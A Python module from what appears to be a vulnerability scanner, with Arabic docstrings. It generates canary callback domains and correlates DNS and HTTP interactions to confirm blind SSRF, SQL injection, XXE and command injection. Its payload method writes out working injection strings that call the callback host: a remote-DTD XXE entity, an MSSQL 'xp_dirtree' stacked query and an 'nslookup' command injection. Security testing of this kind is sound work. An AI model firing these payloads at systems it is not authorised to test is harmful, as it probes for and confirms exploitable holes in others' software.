"""
Out-of-Band (OOB) Blind Interaction Engine
Manages callback domains, generates unique correlation tokens per parameter probe,
and polls for asynchronous DNS queries or HTTP interactions for blind vulnerability verification
(Blind SSRF, Blind SQLi, Blind XXE, Blind Command Injection, Log4j/JNDI).
"""
from __future__ import annotations

import hashlib
import json
import logging
import secrets
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


@dataclass
class OOBInteraction:
    interaction_id: str
    token: str
    protocol: str  # "DNS", "HTTP", "HTTPS", "SMTP"
    remote_address: str
    raw_query_or_path: str
    headers: Dict[str, str] = field(default_factory=dict)
    timestamp: float = field(default_factory=time.time)


@dataclass
class OOBProbeContext:
    probe_id: str
    token: str
    canary_domain: str
    target_endpoint: str
    parameter_name: str
    vulnerability_type: str  # "blind_ssrf", "blind_sqli", "blind_xxe", "blind_rce"
    created_at: float = field(default_factory=time.time)
    verified_interaction: Optional[OOBInteraction] = None


class OOBInteractionClient:
    """
    عميل الاتصالات والاستدعاءات الخارجية خارج النطاق (OOB Interaction Client):
    - يولد نطاقات فريدة (Unique Canary Domains) لكل عملية فحص ومعامل.
    - يستمع ويسجل أي تفاعل خارجي غير متزامن (DNS Resolution أو HTTP Callback).
    - يربط التفاعل فوراً بنقطة النهاية والمعامل الذي تسبب في الاستدعاء لإثبات الثغرة العمياء.
    """

    def __init__(self, base_callback_domain: str = "oob.hunterai.internal"):
        self.base_domain = base_callback_domain.lower().strip(".")
        self.active_probes: Dict[str, OOBProbeContext] = {}
        self.recorded_interactions: List[OOBInteraction] = []

    def generate_probe_context(
        self,
        target_endpoint: str,
        parameter_name: str,
        vulnerability_type: str = "blind_ssrf"
    ) -> OOBProbeContext:
        """إنشاء توكن وسياق استدعاء فريد للفحص الأعمى"""
        # Generate 8-character unique token
        token = secrets.token_hex(4)
        canary_domain = f"{token}.{self.base_domain}"
        probe_id = f"oob_{token}"

        ctx = OOBProbeContext(
            probe_id=probe_id,
            token=token,
            canary_domain=canary_domain,
            target_endpoint=target_endpoint,
            parameter_name=parameter_name,
            vulnerability_type=vulnerability_type
        )
        self.active_probes[token] = ctx
        return ctx

    def craft_canary_payload(self, ctx: OOBProbeContext) -> Dict[str, str]:
        """توليد نصوص الفحص الآمنة لبروتوكولات الـ OOB المختلفة"""
        domain = ctx.canary_domain
        return {
            "http_url": f"http://{domain}/canary_{ctx.token}",
            "https_url": f"https://{domain}/canary_{ctx.token}",
            "dns_lookup": domain,
            "xxe_entity": f'<!ENTITY % dtd SYSTEM "http://{domain}/eval.dtd"> %dtd;',
            "rce_nslookup": f"nslookup {domain}",
            "sql_dns_oracle": f"'; EXEC master..xp_dirtree '//{domain}/a'--"
        }

    def record_incoming_interaction(
        self,
        token: str,
        protocol: str,
        remote_address: str,
        raw_query_or_path: str,
        headers: Optional[Dict[str, str]] = None
    ) -> Optional[OOBProbeContext]:
        """تسجيل تفاعل وارد ومطابقته فوراً مع الفحص الأمني المرتبط به"""
        token_clean = token.lower().strip()
        inter = OOBInteraction(
            interaction_id=f"int_{secrets.token_hex(4)}",
            token=token_clean,
            protocol=protocol.upper(),
            remote_address=remote_address,
            raw_query_or_path=raw_query_or_path,
            headers=headers or {}
        )
        self.recorded_interactions.append(inter)

        if token_clean in self.active_probes:
            ctx = self.active_probes[token_clean]
            ctx.verified_interaction = inter
            logger.info(
                f"[OOBClient] CONFIRMED BLIND INTERACTION: Probe '{ctx.probe_id}' triggered by {protocol} "
                f"from {remote_address} on parameter '{ctx.parameter_name}'"
            )
            return ctx

        return None

    def poll_for_verification(self, token: str) -> Tuple[bool, Optional[OOBInteraction]]:
        """الاستعلام عما إذا تم استلام تفاعل خارجي للتوكن المحدد"""
        token_clean = token.lower().strip()
        if token_clean in self.active_probes:
            ctx = self.active_probes[token_clean]
            if ctx.verified_interaction:
                return True, ctx.verified_interaction
        return False, None
